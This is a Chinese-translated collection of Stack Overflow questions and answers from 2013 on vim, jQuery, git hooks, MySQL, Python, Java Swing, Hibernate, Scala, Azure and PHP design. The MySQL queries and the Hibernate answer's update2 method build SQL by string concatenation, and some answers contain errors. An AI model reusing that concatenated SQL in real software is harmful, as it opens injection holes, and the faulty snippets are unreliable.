> 标签：vim, keyboard-shortcuts, keymapping

我正在尝试执行以下映射`noremap <ESC>:<C-w>l <leader>l`，或`noremap <ESC><C-w>l <leader>l`，或一些实现相同效果的映射，以使窗口拆分之间的切换更容易 100 倍。问题是我收到一条`E20: Mark not set`消息。我究竟做错了什么？这是一个错误吗？还是只是不可能？我有映射来分割窗口，但我似乎无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:45:08.910

我很愚蠢......我的论点顺序错误。

# jquery - 通过单击链接填充输入字段 - 不起作用

> ID：16122130
> 
> 赞同：0
> 
> 时间：2013-04-20T15:38:30.953
> 
> 标签：jquery, input, field

我正在尝试通过单击链接来填写输入字段。此链接的 href 应确定将在此输入字段中填写的内容。

```
$(".search_item").click(function(){
    var selectedChamp=$(this).attr('href').split('=')[1];
    $('.textfield').val( selectedChamp );
       return false;
}); 
```

我使用了以下 JSfiddle： http: [//jsfiddle.net/charlietfl/5u3BZ/](http://jsfiddle.net/charlietfl/5u3BZ/) 但我无法让它为自己工作。

链接是使用 JSRender 生成的。

在此页面上：http: [//lorebook.net/lore/](http://lorebook.net/lore/)你可以看到我想要实现的目标。在顶部的栏中填写一些内容（只需输入字母“A”就会显示一些结果），那里的链接应该在输入字段中输入一些内容。

奇怪的是，在这个页面的底部有一些确实有效的链接。它们使用完全相同的代码，但由于某种原因它们可以工作，而其他链接则不能。

帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:02:37.760

您应该使用`.preventDefault();` 以便在单击时触发替代事件。

```
$(".search_item").click(function(e){
    e.preventDefault();
    var selectedChamp=$(this).attr('href').split('=')[1];
    $('.textfield').val( selectedChamp );
}); 
```

我在您的页面上对其进行了测试，应用了这个小改动后它对我有用。

**编辑：**我收回这个......因为问题不在于脚本本身......如果我将它放到控制台中它已经做了正确的事情......这意味着在脚本启动时它不会找到它需要的 DOM 元素。

*   如果我在搜索之前启动脚本......它不起作用......
*   如果我搜索然后将脚本粘贴到控制台中......它会找到`.search_item`元素并按预期工作。

**所以我不确定你上面的文本字段脚本当前位于哪里......但你应该只在搜索结果元素已经加载并且可以在 DOM 中找到时调用它。**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:38:24.300

我认为这应该有效：

```
pr = "";
setInterval(function(){
  if(document.location.hash != pr){

    $('.textfield').val( document.location.hash.split('=')[1] );

    // Do what you want

    pr = document.location.hash;
  }
}, 50); 
```

# ruby - Git hook post-receive 未运行（Ruby 脚本）

> ID：16122132
> 
> 赞同：1
> 
> 时间：2013-04-20T15:38:48.830
> 
> 标签：ruby, git

我试图让这个脚本工作：[https ://github.com/zmilojko/git-trello/](https://github.com/zmilojko/git-trello/)

在`.git/hooks/post-receive`（当然具有适当的值）：

```
#!/usr/bin/env ruby
require 'git-trello'
GitHook.new(
  :api_key => 'API_KEY',
  :oauth_token => 'OAUTH_TOKEN',
  :board_id => 'TRELLO_BOARD_ID',
  :list_id_in_progress => 'LIST_ID_IN_PROGRESS',
  :list_id_done => 'LIST_ID_IN_DONE',
  :commit_url_prefix => 'https://github.com/zmilojko/git-trello/commits/'
).post_receive 
```

文件是可执行的。如果我在 bash ( `$ .git/hooks/post-receive`) 中运行它，它似乎可以正常工作（除了它没有接收到 git 对标准输入的输入这一事实）。

执行时`git push`，脚本不会运行，也不会抛出任何错误。此外，远程 URL 的形式为`git@github.com:...`

我正在使用`rbenv`，虽然我不明白这怎么可能是一个问题，可以吗？如果是，至少应该显示一个错误，比如找不到 ruby​​ 命令或其他什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:18:34.047

post-receive 是一个服务器端的钩子。我假设您希望它在本地计算机上运行，​​当您从本地计算机推送到 GitHub 时。它不是那样工作的。

这是 Git 的所有服务器和客户端挂钩的链接。

[http://git-scm.com/book/ch7-3.html#Server-Side-Hooks](http://git-scm.com/book/ch7-3.html#Server-Side-Hooks)

# mysql - 连接来自多列和 2 个表的数据

> ID：16122133
> 
> 赞同：0
> 
> 时间：2013-04-20T15:38:48.907
> 
> 标签：mysql, join

那两个是我用于数据的表。现在，当我想加入这两张桌子时，我卡在了 JOIN ON golub ......我知道我在那里犯了错误，但我不知道它是什么。IDmajka 和 IDotac 下面的值有时可能为 0。该值 0 来自表“golub”，它不存在。即使我将存在于表“golub”中的值放入它仍然不起作用。它不会收集任何数据。请忽略 drzava 上的 JOIN 和状态，因为它可以正常工作。

> 我的查询

```
SELECT * FROM popis_golubova
JOIN golub ON (golub.ID = popis_golubova.IDgolub
           AND golub.ID = popis_golubova.IDmajka 
           AND golub.ID = popis_golubova.IDotac)
JOIN drzava ON (drzava.ID=popis_golubova.IDdrzava)
JOIN status ON (status.ID=popis_golubova.IDstatus)
WHERE popis_golubova.IDkorisnik='$ID_KORISNIK' 
```

> 表“golub”

![桌子](https://i.stack.imgur.com/JuED7.png)

> 表“popis_golubova”

![在此处输入图像描述](https://i.stack.imgur.com/xDCyn.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:05:11.267

如果要帮助某人，这是解决方案

```
SELECT 
O.brojgoluba AS o_brojgoluba,
M.brojgoluba AS m_brojgoluba, 
golub.spol, golub.boja, golub.rasa, golub.ime, golub.godina, golub.brojgoluba, drzava.drzava, status.status
FROM popis_golubova
JOIN drzava ON (drzava.ID=popis_golubova.IDdrzava)
JOIN status ON (status.ID=popis_golubova.IDstatus)
JOIN golub AS O ON (O.ID=popis_golubova.IDotac)
JOIN golub AS M ON (M.ID=popis_golubova.IDmajka)
JOIN golub ON (golub.ID=popis_golubova.IDgolub) 
WHERE popis_golubova.IDkorisnik='$ID_KORISNIK'
ORDER BY popis_golubova.IDgolub 
```

# jquery - $.map 对象属性到具有相似名称的新数组

> ID：16122135
> 
> 赞同：0
> 
> 时间：2013-04-20T15:39:25.853
> 
> 标签：jquery

我有以下对象数组：

```
var blah = [
    { foo: 1, bar: 2 },
    { foo: 2, bar: 1 }
]; 
```

我想将属性名称从`foo`to`Foo`和`bar`to更改为`Bar`。所以我`jQuery.map`试了一下。但是，我不确定要返回什么：

```
var newBlah = $.map(blah, function(i, v){
    return /* ...? */;
}); 
```

期望的结果：

```
console.log(newBlah); //[{ Foo: 1, Bar: 2... etc 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:41:25.353

您使用旧对象的值创建一个新对象：

```
var newBlah = $.map(blah, function(v, i){
  return { Foo: v.foo, Bar: v.bar };
}); 
```

注意：回调中的参数是项目，然后是索引。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T15:41:22.250

```
var newBlah = $.map(blah, function(i, v){
    return {
        Foo : this.foo,
        Bar : this.bar
    }
}); 
```

如果你想让它通用，请告诉我。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T15:43:10.393

假设名称是已知的，那么只使用对象文字会更容易：

```
return { Foo: v.foo, Bar: v.bar }; 
```

如果您想将任何对象的属性名称大写，则涉及更多：

```
var result = {};

for(var x in v) {
    if(v.hasOwnProperty(x)) {
        result[x.charAt(0).toUpperCase() + x.substring(1)] = v[x];
    }
}

return result; 
```

（尽管这不适用于 getter 和 setter 等。）

PS您的论点顺序错误；`jQuery.map`是`v, i`，`jQuery.fn.map`而是`i, v`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T15:47:59.083

以下方法也可以。它复制属性值，然后删除不必要的属性。

```
var blah = [{foo:1, bar:2}, {foo:2, bar:3}];
for (var i = 0; i < blah.length; i++){
  blah[i].Foo = blah[i].foo;
  delete blah[i].foo;
  blah[i].Bar = blah[i].bar;
  delete blah[i].bar;
} 
```

这种方法允许您不实例化新对象。如果您的对象复杂且相互关联，这可能是首选方式

# javascript - 1.9.1 与 1.8.3 中的 Angular.js/jQuery html 字符串解析

> ID：16122139
> 
> 赞同：8
> 
> 时间：2013-04-20T15:40:14.713
> 
> 标签：javascript, jquery, angularjs, jquery-1.9, jquery-1.8

尝试做`angular.element(stringWithHtmlStructure);`原因

```
Error: Syntax error, unrecognized expression: <div id="foo">bar</div> 
```

在 jquery 1.9.1 中，但它在 jquery 1.8.3 中有效

是问题还是功能？可能是安全一号？我该如何处理？

1.8.3 示例[http://plnkr.co/edit/ZYYKIixcYzOL46hq0puS?p=preview](http://plnkr.co/edit/ZYYKIixcYzOL46hq0puS?p=preview) 1.9.1 示例[http://plnkr.co/edit/ETmQMY8KoCP0gaKdSrMD?p=preview](http://plnkr.co/edit/ETmQMY8KoCP0gaKdSrMD?p=preview)

这绝对不是任何有角度的东西的问题，做`$(stringWithHtmlStructure)`同样的失败，你可以在这里看到[http://plnkr.co/edit/FqvOKZ62t0IJ57cT05ew?p=preview](http://plnkr.co/edit/FqvOKZ62t0IJ57cT05ew?p=preview)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-20T15:53:38.687

问题肯定出在 jquery 1.9.1

> 带有前导空格的 HTML 字符串：出于安全原因，jQuery 1.9 限制了由 $() 处理的字符串。尽管我们建议您使用 $.parseHTML() 来处理任意 HTML，例如模板，但 1.1.0 版本的 Migrate 插件恢复了旧的行为。

处理它的方法是使用任何类型的修剪功能，无论是 jquery 的 $.trim 还是下划线修剪甚至你自己的。

请注意，仅在尝试使用 $templateCache 中的模板时才会出现此问题，如果您在指令上使用 template 或 templateUrl attr 它工作正常，我猜角度内部会修剪它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T15:53:45.387

如果您的字符串包含前导空格，您应该删除它们。

这应该有效：

```
angular.element($.trim(stringWithHtmlStructure)); 
```

# python - + 和 % 有什么区别？

> ID：16122141
> 
> 赞同：0
> 
> 时间：2013-04-20T15:40:22.070
> 
> 标签：python, python-2.5

如果我做：

```
logging.debug('subject: '+subject)
logging.debug('body: '+body) 
```

然后它运作良好。如果我将其替换为：

```
logging.debug('subject: %s, body: %s' % (subject, body)) 
```

然后我得到

```
UnicodeDecodeError: 'ascii' codec can't decode byte 0xd0 in position 0: ordinal not in range(128) 
```

如何避免这个错误？

更新。添加了第二个变量`body`。`subject`并且`body`是字符串变量。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T15:45:30.107

这就是我将如何使用它：

```
logging.debug(u'subject: %s', subject) 
```

在你的情况下`subject`似乎是 unicode。所以格式也应该是unicode。

当你这样做时`'subject: '+subject`，如果其中一个操作数是 unicode，另一个会自动转换为 unicode。

请注意，我做了`debug(u'subject: %s', subject)`而不是`debug(u'subject: %s' % subject)`- 所以字符串仅在记录器实际发出记录时才被格式化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:43:23.263

这就是它应该如何使用（python `2.7`）：

```
logging.debug('subject: %s' % subject) 
```

例如使用格式规范`print`：

```
>>> sr = "aaaaaa"
>>> print "d%s" % s
daaaaaa 
```

# java - 更改 Frame 字体和 Frame 中所有组件的字体

> ID：16122142
> 
> 赞同：1
> 
> 时间：2013-04-20T15:40:25.423
> 
> 标签：java, swing, awt

我有以下给定的练习代码，我试图找出 JPanel 中的字体与 Panel 字体不同的原因。我注意到有一个 setFont 方法可以改变 Frame 的字体，但是 Frame 内的 Panel 的字体也发生了变化，但是 JPanel 中的字体没有改变，这是为什么：

```
import java.awt.*; 
import javax.swing.*; 
import java.awt.event.*; 
public class MyAppCheck extends Frame { 
public MyAppCheck (String title) { 
    super(title); 
    setFont(new Font("Verdana", Font.BOLD, 12)); 
    setLayout(new GridLayout(1,3)); 
    Panel cboxes = new Panel(); 
    cboxes.setLayout(new GridLayout(0,1)); 
    Color c = new Color(80,120,230); 
    cboxes.setBackground(c); 
    Checkbox c1 = new Checkbox("Windows");  Checkbox c2 = new Checkbox("Linux"); 
    Checkbox c3 = new Checkbox("IRIX"); 
    Checkbox c4 = new Checkbox("MacOS");

    cboxes.add(c1); 
    cboxes.add(c2); 
    cboxes.add(c3); 
    cboxes.add(c4); 
    c2.setState(true); 
    c4.setState(true); 
    JPanel cboxgrp = new JPanel(); 
    cboxgrp.setLayout(new GridLayout(0,1)); 
    cboxgrp.setBackground(Color.YELLOW); 
    cboxgrp.setBorder(BorderFactory.createTitledBorder("Languages")); 
    CheckboxGroup progLang = new CheckboxGroup(); 
    Checkbox cg1 = new Checkbox("Pascal", false, progLang); 
    Checkbox cg2 = new Checkbox("Java", false, progLang); 
    Checkbox cg3 = new Checkbox("Basic", false, progLang); 
    Checkbox cg4 = new Checkbox("C", false, progLang); 
    Checkbox cg5 = new Checkbox("C++", false, progLang);

    cboxgrp.add(cg1); 
    cboxgrp.add(cg2); 
    cboxgrp.add(cg3); 
    cboxgrp.add(cg4); 
    cboxgrp.add(cg5); 
    cg3.setState(true); 
    add(cboxes); 
    add(cboxgrp); 
                    System.out.println("Font_1:"+cboxes.getFont());
                    System.out.println("Font_2:"+cboxgrp.getFont());
    addWindowListener(new WindowAdapter() { 
        public void windowClosing(WindowEvent evt) { 
            System.exit(0); 
        } 
    }); 
} 

public static void main(String[] args){ 
    MyAppCheck app2 = new MyAppCheck("Application Window"); 
    app2.setSize(200, 200); 
    app2.setVisible(true); 

} 
} 
```

对不起我的英语不好......也只是告诉你我是 awt/swing 的新手

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:58:25.983

`java.awt.Panel`选择默认的系统字体；`javax.swing.JPanel`需要它来自[UIManager](http://docs.oracle.com/javase/6/docs/api/javax/swing/UIManager.html)。请注意，[混合使用重量级和轻量级组件](http://www.oracle.com/technetwork/articles/java/mixing-components-433992.html)是一个坏主意。

# java - 在休眠中更新对象

> ID：16122143
> 
> 赞同：0
> 
> 时间：2013-04-20T15:40:29.440
> 
> 标签：java, hibernate, primefaces, sql-update

我正在使用 Primefaces 3.5 + 休眠 4.2.0

我正在使用 primefaces 中的[单元格编辑表](http://www.primefaces.org/showcase/ui/datatableCellEditing.jsf)，并希望在单击一个字段并更改表值时更新我的​​数据库中的产品表。但是，我只找到了 hibernate 的简单属性的更新方法，如下所示：

```
EntityManager entityManager = entityManagerFactory.createEntityManager();
entityManager.getTransaction().begin();

String jpqlUpdate = "update Customer set name = :newName where name = :oldName"
int updatedEntities = entityManager.createQuery( jpqlUpdate )
                            .setParameter( "newName", newName )
                            .setParameter( "oldName", oldName )
                            .executeUpdate();
entityManager.getTransaction().commit();
entityManager.close(); 
```

如何在休眠状态下更新整个对象？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:57:47.813

你可以试试这个：

**数据访问类：**

```
public boolean update(YourClass yourObject) {
    Transaction transaction = null;
    boolean result = false;
    try {
        SessionFactory sessionFactory = HibernateUtil.getSessionFactory();
        Session session = sessionFactory.getCurrentSession();
        transaction = session.beginTransaction();
        session.update(yourObject);
        transaction.commit();

        result = true;

    } catch (Exception ex) {
        ex.printStackTrace();
        if (transaction != null) {
            transaction.rollback();
        }
    }
    return result;
}
 public boolean update2(YourClass yourObject)  {
    Transaction transaction = null;
    int result = -1;
    try {
        String sqlQuery = "UPDATE YourTable SET yourColumn1=" + yourObject.value1
                + ", yourColumn2='" + yourObject.value2 + "' WHERE [some condition]=";
        SessionFactory sessionFactory = HibernateUtil.getSessionFactory();
        Session session = sessionFactory.getCurrentSession();
        transaction = session.beginTransaction();
        SQLQuery query = session.createSQLQuery(sqlQuery);
        result = query.executeUpdate();
        transaction.commit();

    } catch (Exception ex) {
        ex.printStackTrace();
        if (transaction != null) {
            transaction.rollback();
        }
    }
    return result;
} 
```

**休眠.cfg.xml**

```
<hibernate-configuration>
<session-factory name="session">
    <property name="hibernate.connection.driver_class">[db_driver]</property>
    <property name="hibernate.connection.url">jdbc:[db_type]://[db_ip]:[db_port]/YourDatabase</property>
    <property name="hibernate.connection.username">username</property>
    <property name="hibernate.connection.password">password</property>
    <property name="hibernate.dialect">[db_dialect]</property>

    <property name="hibernate.show_sql">true</property>
    <property name="hibernate.format_sql">false</property>
    <property name="hibernate.current_session_context_class">thread</property>

    <mapping class="dataaccess.entity.YourClass"/>

</session-factory>
</hibernate-configuration> 
```

**HibernateUtil.class**

```
import org.hibernate.SessionFactory;
import org.hibernate.cfg.AnnotationConfiguration;

public class HibernateUtil {

private static final SessionFactory sessionFactory;

static {
    try {
        sessionFactory = new AnnotationConfiguration().configure("/hibernate.cfg.xml").buildSessionFactory();
    } catch (Throwable ex) {
        System.err.println("Initial SessionFactory creation failed." + ex);
        throw new ExceptionInInitializerError(ex);
    }
}

public static SessionFactory getSessionFactory() {
    return sessionFactory;
}
} 
```

# ravendb - RavenDB 推送通知：不包括实际文档？

> ID：16122146
> 
> 赞同：3
> 
> 时间：2013-04-20T15:40:53.400
> 
> 标签：ravendb

我已经使用 RavenDB成功实现了[推送通知（请参见下面的代码）。](http://ravendb.net/docs/2.0/client-api/changes-api)我期待实际文档包含在更改通知中。这样，所有的 UI 客户端都可以显示信息。但是，似乎只有 Id 和 Etag 属性可用于更改的文档。

**如果我希望客户端能够显示有关文档的信息，我应该怎么做？客户现在是否需要进行数据库调用以根据 ID 获取文档？**必须进行数据库调用以获取信息似乎效率低下。但是，这是应该发生的事情吗？

```
documentStore.Changes()
    .ForDocumentsStartingWith("LogMessages")
    .Subscribe(change =>
    {
        if (change.Type == DocumentChangeTypes.Put)
        {
            // Fire event so consumers can display document info
            // Uh oh, are change.Id and change.Etag all we have here?
            DatabaseItemAdded(null, new EventArgs<string>(change.Id));
        }
}); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-21T09:23:20.823

是的，您需要调用数据库来获取新文档。这样做的原因是，如果您只需要更改通知，则发送文档（可能非常大）会很昂贵）。

# c++ - 将值传递到 Vector3f

> ID：16122147
> 
> 赞同：0
> 
> 时间：2013-04-20T15:41:12.793
> 
> 标签：c++, class

我希望能够将 3 个值传递给一个对象，然后将其存储在一个名为 Vector3f 的类中。Vector3f 有 x,y,z 值；

IE：

```
Object(Vector3f Position); //Class constructor

Object myObject(0,10,20); //Declare object 
```

这是正确的吗？

或者我必须这样做：

```
Vector3f vect(0,10,20);
Object myObject(vect); 
```

请问有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:43:57.307

如果构造函数采用单个`Vector3f`参数，则必须将单个`Vector3f`对象传递给它，并且三个浮点数将不起作用。但是您可以将其写在一行中：

```
Object myObject(Vector3f(0, 10, 20)); 
```

您还可以声明一个额外的构造函数来代替接受三个浮点数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T15:45:35.870

第二个，因为多个参数构造函数不能被隐式转换

虽然`C++11`你可以做`Object myObject({0, 10, 20});`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T15:42:52.940

如果没有其他信息，您应该按照第二种方式进行：

```
Vector3f vect(0,10,20);
Object myObject(vect); 
```

或者

```
 Vector3f myObject(vect(0,10,20)); 
```

这将首先创建一个对象，`Vector3f`然后将其作为参数传递给`Object`类的构造函数，该构造函数将对象`Vector3f`作为参数。

# scala - 在 Scala 2.10 中使用混合的复杂 Java 泛型集合

> ID：16122154
> 
> 赞同：2
> 
> 时间：2013-04-20T15:41:37.923
> 
> 标签：scala, scala-2.10, scala-java-interop

在我工作的公司中，我们从（Java）模式中获得了很多好处，可以总结如下：

我们可以通过他们的特殊/智能“ids”获得一些“东西”。每个“事物”都知道它的 id，并且 id 是“聪明的”，因为您可以要求他们给您他们识别的“事物”。在一个复杂的、不断增长的“事物”层次结构中，这简化了维护并消除了很多代码（重复和其他）。我敢肯定，你们中的一些人可能会觉得这很奇怪，我可以解释为什么会这样，但事实是它就是这样，到目前为止它很有帮助，不是问题的一部分。

Java 对 this 的定义总结如下（稍作改写）：

```
interface Id<I extends Id<I,T>, T extends Thing<I,T>> {
  T getThing();
  ...
}

interface Thing<I extends Id<I,T>, T extends Thing<I,T>> {
  public I getId();
  ...
} 
```

有时，我们需要在给定一批不同 id 的情况下获取“一批”事物（这会通过网络，因此需要进行批处理以加快速度）。出于本描述的目的，它可以写成：

```
public Map<Id<?,?>,Thing<?,?>> getManyThings(List<Id<?,?>> idsToGetThingsFor); 
```

（方法参数只是id的多重性，它是一个集合，列表还是其他都没有关系）

现在，在网络的另一端，这个方法是在 Scala 2.9 中实现的，相当丑陋地避免了 Scala 泛型的严格性。我们正在尝试升级到 Scala 2.10，但事情不再编译，必须想办法解决这个问题。诀窍是有一个 Scala 方法总结如下：

```
def getOneThing[I <: Id[I,T],T <: Thing[I,T]](id: I): T; 
```

该方法会根据许多因素适当地检查、处理和分配调用 - 在这里解释太多并且无关紧要。

现在，是 getManyThings() 方法迭代传递给它的 id，并需要将它们作为参数传递给 getOneThing()。那就是事情失败的地方。getManyThings() 只知道它获得的 id 本质上是 Id[ *,* ] 并且 Scala 抱怨 [ *,* ] 对于 getOneThing的 [I <: Id[I,T],T <: Thing[I,T]] 来说不够好() 要求：

```
... error: inferred type arguments [Id[_$16,_$17],Nothing] do not conform to method getOneThing's type parameter bounds [I <: Id[I,T],T <: Thing[I,T]] 
```

注意 - 为 Id 和 Thing 声明非参数化（非泛型）基类并没有真正帮助，因为它只会将问题推到（太多）其他地方。我们选择了非常严格的类型以确保代码质量，但我们确实必须有一种方法来处理“混合”集合。

有什么帮助吗？请！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T23:15:18.467

我假设你有这样的方法：

```
def getManyThings[I <: Id[I, T], T <: Thing[I, T]](ids:List[I]):List[T] = 
  ids map getOneThing 
```

这将给出一个错误，因为编译器无法推断您想要调用该`getOneThing`方法`T`作为第二个类型参数。

为了“帮助”编译器，您需要明确地传递它们：

```
trait Id[I <: Id[I, T], T <: Thing[I, T]]
trait Thing[I <: Id[I, T], T <: Thing[I, T]]

def getOneThing[I <: Id[I, T], T <: Thing[I, T]](id:I):T = ???

def getManyThings[I <: Id[I, T], T <: Thing[I, T]](ids:List[I]):List[T] = 
  ids map ( getOneThing[I, T](_) ) 
```

# python - 从python中的字典列表中合并字典

> ID：16122159
> 
> 赞同：0
> 
> 时间：2013-04-20T15:42:04.670
> 
> 标签：python, list, merge, dictionary

我创建了一个字典列表，其中每个字典都有一个列表形式的值，如下所示：

```
dictlist=[{a:['e','f','g'],b:['h','i','k'],c:['u','v',w]},{a:['t','u']}] 
```

上面的示例在列表中包含两个字典：

```
one is {a:['e','f','g'],b:['h','i','k'],c:['u','v',w]} 
and another dictionary is {a:['t','u']} 
```

我想要的只是组合这个列表的元素，以便在列表中生成一个具有相同键和值的完整字典，如下所示：

```
finaldictionary = {a:['e','f','g','t','u'],b:['h','i',k],c:['u','v','w']} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T15:45:17.900

你可以[`collections.defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict)在这里使用：

```
>>> from collections import defaultdict

>>> dic=defaultdict(list)

>>> dictlist=[{'a':['e','f','g'],'b':['h','i','k'],'c':['u','v','w']},{'a':['t','u']}]

>>> for x in dictlist:
    for k,v in x.items():
        dic[k].extend(v)

>>> dic
defaultdict(<type 'list'>, {'a': ['e', 'f', 'g', 't', 'u'], 'c': ['u', 'v', 'w'], 'b': ['h', 'i', 'k']}) 
```

或使用`dict.setdefault`：

```
>>> dic={}

>>> for x in dictlist:
        for k,v in x.items():
            dic.setdefault(k,[]).extend(v)

>>> dic
{'a': ['e', 'f', 'g', 't', 'u'], 'b': ['h', 'i', 'k'], 'c': ['u', 'v', 'w']} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T15:46:51.057

“老派”解决方案将是这样的......

```
finaldict = {}
dictlist = [{'a': ['e','f','g'], 'b': ['h','i','k'], 'c': ['u','v','w']},
            {'a': ['t','u']}]
for d in dictlist:
    for k in d.keys():
        try:
            finaldict[k] += d[k]
        except KeyError:
            finaldict[k] = d[k] 
```

...这可能适用于自 v1.0 以来的所有 Python 版本，但有许多更新的方法可以做到这一点。

# windows-phone-7 - 使用 windows phone 7 将图像上传到 azure blob 存储

> ID：16122160
> 
> 赞同：0
> 
> 时间：2013-04-20T15:42:16.547
> 
> 标签：windows-phone-7, azure, azure-storage, azure-blob-storage, azure-mobile-services

我一直在尝试寻找一种方法来使用 Windows azure blob storage 和 windows phone 上传图像。我尝试将 windows azure 存储客户端用于 windows phone，但这似乎不再起作用。我还尝试了大约 2 个其他 nuget 包，我还尝试了一个 Web 服务来处理上传，但效果并不好，因为我不完全应该如何将 Web 服务连接到我的手机应用程序。我也尝试使用 Windows azure 移动服务上传它。谁能给我一些关于我应该如何让它发挥作用的指示？

windows phone 的 windows azure 存储客户端问题

Install-Package Phone.Storage -Version 1.0.1 正在尝试解决依赖项“SilverlightActivator (≥ 1.0.3)”。'Phone.Storage 1.0.1' 已安装。ProjectName 已经引用了“Phone.Storage 1.0.1”。

但没有添加到参考文件夹中可见的参考

移动服务问题试过这个： http: [//www.windowsazure.com/en-us/develop/mobile/tutorials/upload-images-to-storage-dotnet/](http://www.windowsazure.com/en-us/develop/mobile/tutorials/upload-images-to-storage-dotnet/)

但找不到适用于 Windows phone 7 的存储客户端库

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:14:32.947

您需要从 Blob 存储中获取共享访问签名 (SAS) 才能上传。

您可以使用自己的 Web 服务来执行此操作，该服务使用存储客户端 SDK 来获取 SAS 并将其发送回手机，或者您可以将移动服务用于相同目的。

[http://www.nickharris.net/index.php/2012/11/12/how-to-upload-an-image-to-windows-azure-storage-using-mobile-services/](http://www.nickharris.net/index.php/2012/11/12/how-to-upload-an-image-to-windows-azure-storage-using-mobile-services/)

# jquery - 使用 jquery modal 时将多个 div 添加到表单中

> ID：16122163
> 
> 赞同：0
> 
> 时间：2013-04-20T15:42:44.550
> 
> 标签：jquery, asp.net, jquery-ui, updatepanel, modal-dialog

我有 jquery 模式窗口。我打开此窗口单击**单击此处**参考，这是我的代码：

```
<asp:Content runat="server" ID="BodyContent" ContentPlaceHolderID="MainContent">
<asp:UpdatePanel ID="UpdatePanel1" runat="server">
    <ContentTemplate>
        <asp:Button runat="server" Text="Button" ID="Button" />
        <a onclick ="$('#divReuse').dialog();" href="#">click here</a>
        <div id="divReuse">
            this is content of the modal window.
        </div>
    </ContentTemplate>
</asp:UpdatePanel> 
```

我的更新面板中有一个按钮。当我单击该按钮时，它会进行回发（异步）。在更新面板内进行此回发之后，我再次单击链接**单击此处** ![在此处输入图像描述](https://i.stack.imgur.com/KGR2M.png)

**问题**是 jquery 在我的标记中添加了具有相同内容的额外 div ![在此处输入图像描述](https://i.stack.imgur.com/O8X99.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T09:11:08.500

按下关闭按钮时，我删除了 jquery 生成的 div。像这样：

```
 $('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').remove(); 
```

# php - 类 A 是否可以保留类 B 的依赖项，因为类 A 在调用方法后实例化类 B

> ID：16122166
> 
> 赞同：1
> 
> 时间：2013-04-20T15:42:56.097
> 
> 标签：php, oop, dependency-injection

我有一个我称之为我的类`Dispatcher`，当它的`dispatch()`方法运行时，它会实例化请求的控制器。

我`AbstractController`有一个像这样的构造函数

```
public function __construct(RequestInterface $request, ResponseInterface $response, ViewFactory $viewFactory, ServiceFactory $serviceFactory) 
```

如您所见，我的控制器有 4 个依赖项。

在我实例化我的那一刻，我`Dispatcher`将`ViewFactory`and注入`ServiceFactory`到它的构造函数中，然后当我运行该`dispatch()`方法时，我提供`Request`and`Response`对象作为参数，然后我可以将所有四个依赖项注入到我的控制器中。

在调用`dispatch()`方法时提供所有控制器依赖项或在构造函数中提供所有控制器依赖项`Dispatcher`然后运行`dispatch()`不带参数的方法会更好，还是总体上有更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:18:24.937

在调用某个方法之前，您有 4 个要注入新控制器实例的依赖项，2 个具有请求/响应生命周期，2 个具有更长的生命周期（进程？）。我会通过创建控制器工厂将控制器的创建与调用分开。

控制器工厂将使用仅接收请求和响应对象作为参数的方法来实例化控制器。工厂会知道两个生命周期较长的依赖项的生命周期，可能共享相同的生命周期。然后，工厂的用户可以自由地在返回的（抽象）控制器上调用他们想要的任何方法。这比您建议的委托模式更灵活。您当然仍然可以使用委托，但是我可能仍然让 Dispatcher 只进行调度并将对象创建留给工厂。

当然，这类问题没有正确答案。这一切都取决于很多因素（要求、代码库的大小、项目等）。希望这会有所帮助。祝你好运！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-21T07:56:51.053

### 一些“废话”

这是我在设计 API 时使用的经验法则：*如果你的类有 3 个以上的依赖项，那么它做的太多了。*

您在构造函数中传递的依赖项应该是您的实例运行所必需的。就您而言，您在那里有一个控制器。控制器职责如下：

> 控制器可以向其关联视图发送命令以更改视图对模型的表示。它还可以向模型发送命令以更新模型的状态。   ^([来源：[维基百科](https://en.wikipedia.org/wiki/Model_view_controller)])

控制器**不**应该负责视图实例的创建或渲染。

### 关于原来的问题：

我不确定`Dispatcher`实例的作用是什么，但它们不应该处理创建逻辑本身。您在这里最终得到的是可能的[LoD](http://c2.com/cgi/wiki?LawOfDemeter)违规和明确的[SRP](http://en.wikipedia.org/wiki/Single_responsibility_principle)违规的混合。

创建逻辑应该隔离到工厂和构建器。这种方式还可以让您将`Dispatcher`实例与控制器构造函数的足迹分离。目前，如果您引入了不同的控制器子类，具有不同的依赖项集，您还需要更改`Dispatcher`实现。

至于“如何制造工厂”，你可以[在这里](https://stackoverflow.com/a/11369679/727208)找到一个简化的例子。

# scala - 方向键上的奇怪 IntelliJ 行为

> ID：16122167
> 
> 赞同：0
> 
> 时间：2013-04-20T15:42:56.377
> 
> 标签：scala, intellij-idea

